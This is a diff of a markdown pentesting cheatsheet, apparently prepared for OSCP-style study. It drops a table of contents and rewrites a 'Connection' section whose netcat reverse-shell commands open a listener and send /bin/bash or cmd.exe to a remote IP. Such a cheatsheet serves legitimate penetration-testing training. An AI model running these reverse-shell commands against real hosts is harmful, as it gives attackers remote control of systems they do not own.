@@ -52,24 +52,14 @@ https://github.com/r4hn1/Pentesting-Cheatsheet
 - https://v3ded.github.io/categories/
 - https://0xdf.gitlab.io/
 
-# Table of Content
-- [Active Directory Pentesting](#active-directory-pentesting)
-  - [Enumeration](#enumeration)
-    - [Powerview](#powerview)
-
 # Brief Pentest command cheatsheet
 - https://github.com/deo-gracias/oscp/blob/master/pentest_command_cheat_sheet.md
 
 # Initial Access 
 
 ## Connection
-```bash
-#attacker
-root@kali:  rlwrap nc -nlvp 4444
-#target
-nc -nv 10.10.0.25 666 -e /bin/bash
-nc.exe 192.168.100.113 4444 –e cmd.exe
-```
+* attacker: `rlwrap nc -nlvp 4444`
+* target: `nc -nv 10.10.0.25 666 -e /bin/bash` or `nc.exe 192.168.100.113 4444 –e cmd.exe`
 
 ## Enumeration
 1. https://github.com/oncybersec/oscp-enumeration-cheat-sheet?tab=readme-ov-file#ssh-22tcp
